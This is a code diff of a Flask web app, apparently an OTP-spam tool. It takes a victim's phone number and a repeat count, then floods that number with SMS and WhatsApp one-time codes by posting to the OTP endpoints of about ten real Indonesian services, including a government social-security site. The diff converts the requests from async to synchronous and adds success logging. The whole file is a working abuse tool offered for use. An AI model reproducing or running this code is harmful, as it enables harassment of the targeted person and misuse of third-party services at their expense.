@@ -1,9 +1,5 @@
-from aiohttp import ClientSession
 from flask import Flask, request, render_template, redirect, url_for, flash
-import asyncio
-import random
-import json
-import uuid
+import requests, json, random, uuid
 
 app = Flask(__name__)
 app.secret_key = "b'\xfd!\x11\x9frZ%\x93Ip\xbf\xdb8{-B\x14\xb9\xa58B\xa6\xc8\x15'"
@@ -45,24 +41,18 @@ def format_phone_number(provider, phone_number):
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
-        flash(f'Successfully Spam OTP')
         phone_number = request.form['phone_number']
         otp_count = int(request.form['otp_count'])
+        flash(f'Successfully Spam {otp_count} OTPs to {phone_number}')
         send_otp(phone_number, otp_count)
         return redirect(url_for('index'))
     return render_template('index.html')
 
-async def send_otp(phone_number, otp_count):
+def send_otp(phone_number, otp_count):
     providers = ['danacita', 'sayurbox', 'matahari', 'mraladin', 'pinhome', 'saturdays', 'redbus', 'sobatbangun', 'nutriclub', 'ruangguru', 'bpjsktn']
-    async with ClientSession() as session:
-        tasks = []
-        for i in range(otp_count):
-            for provider in providers:
-                formatted_phone_number = format_phone_number(provider, phone_number)
-                tasks.append(send_otp_to_provider(session, provider, formatted_phone_number))
-        await asyncio.gather(*tasks)
-
-async def send_otp_to_provider(session, provider, formatted_phone_number):
+    for _ in range(otp_count):
+        for provider in providers:
+            formatted_phone_number = format_phone_number(provider, phone_number)
             if provider == 'sayurbox':
                 headers_sayurbox = {
                     'Accept': '*/*',
@@ -85,9 +75,12 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
                 })
 
-                async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_sayurbox, data=data_whatsapp_sayurbox) as response:
-                    await response.text()
-                
+                response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
+                if response_sayurbox_wa.status_code == 200:
+                    print(f"Success sending Whatsapp to {formatted_phone_number} via SayurBox")
+                else:
+                    print(f"Failed to send Whatsapp to {formatted_phone_number} via SayurBox")
+
             if provider == 'danacita':
                 headers_danacita = {
                     "Accept": "application/json, text/plain, */*",
@@ -112,8 +105,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                 })
                 
                 
-                async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita) as response:
-                    await response.text()
+                response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
+                if response_danacita.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Danacita")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Danacita")
             
             if provider == 'misteraladin':
                 headers_misterAladin = {
@@ -143,8 +139,12 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "type": "register"
                 })
                 
-                async with session.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin) as response:
-                    await response.text()
+                response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
+                if response_mraladin.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
+                else: 
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
+
             if provider == 'pinhome':
                 #pinhome
                 headers_pinhome = {
@@ -176,9 +176,12 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "phoneNumber": formatted_phone_number
                 })
                 
-                async with session.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome) as response:
-                    await response.text()
-
+                response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
+                if response_pinhome.status_code == 201:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
+                
             if provider =='saturdays':
                 headers_saturdays = {
                     "Accept": "*/*",
@@ -211,9 +214,12 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "type": "MSG"
                 })
                 
-                async with session.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays) as response:
-                    await response.text()
-                
+                response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
+                if response_saturdays.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Saturdays")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Saturdays")
+        
             if provider == 'kelaspintar':
                 headers_kelaspintar = {
                     "Accept": "application/json, text/plain, */*",
@@ -238,9 +244,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "phone_number": formatted_phone_number,
                 })
                 
-                async with session.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar) as response:
-                    await response.text()
-                
+                response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
+                if response_kelaspintar.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
             
             if provider =='sobatbangun':
                 headers_sobatbang = {
@@ -265,9 +273,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "email_or_phone": formatted_phone_number,
                 })
                 
-                async with session.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun) as response:
-                    await response.text()
-               
+                response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun)
+                if response_sobatbangun.status_code == 201:
+                    print(f"Berhasil mengirim OTP To : {formatted_phone_number} via SobatBangun")
+                else:
+                    print(f"Gagal mengirim OTP To : {formatted_phone_number} via SobatBangun")
             if provider == 'nutriclub':
                 headers_nutriclub = {
                     "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -292,8 +302,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "old_phone": formatted_phone_number,
                 })
                 
-                async with session.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub) as response:
-                    await response.text()
+                response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub)
+                if response_data_nutriclub.status_code == 200:
+                    print(f"Berhasil mengirim OTP To: {formatted_phone_number} via Nutriclub")
+                else:
+                    print(f"Gagal mengirim OTP To: {formatted_phone_number} via Nutriclub")
             
             if provider == 'bpjsktn':
                 headers_bpjsktn = {
@@ -320,8 +333,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "nomor_handphone": formatted_phone_number,
                 })
                 
-                async with session.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp", headers=headers_bpjsktn, data=data_bpjsktn) as response:
-                    await response.text()
+                response_bpjsktn = requests.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp", headers=headers_bpjsktn, data=data_bpjsktn)
+                if response_bpjsktn.status_code == 200:
+                    print(f"Berhasil mengirim OTP To: {formatted_phone_number} via BPJSKetenagakerjaan")
+                else:
+                    print(f"Gagal mengirim OTP To: {formatted_phone_number} via BPJSKetenagakerjaan")
                 
             if provider =='sociolla':
                 headers_sociolla = {
@@ -351,9 +367,11 @@ async def send_otp_to_provider(session, provider, formatted_phone_number):
                     "entity": formatted_phone_number
                 })
                 
-                async with session.post("https://soco-api.sociolla.com/auth/otp/code", headers=headers_sociolla, data=data_sociolla) as response:
-                    await response.text()
-            
+                response_sociolla = requests.post("https://soco-api.sociolla.com/auth/otp/code", headers=headers_sociolla, data=data_sociolla)
+                if response_sociolla.status_code == 200:
+                    print(f"Berhasil mengirim OTP To: {formatted_phone_number} via Sociolla {response_sociolla.status_code} {response_sociolla.text}")
+                else:
+                    print(f"Gagal mengirim OTP To: {formatted_phone_number} via Sociolla {response_sociolla.status_code} {response_sociolla.text}")
 
 if __name__ == '__main__':
     app.run(debug=True)
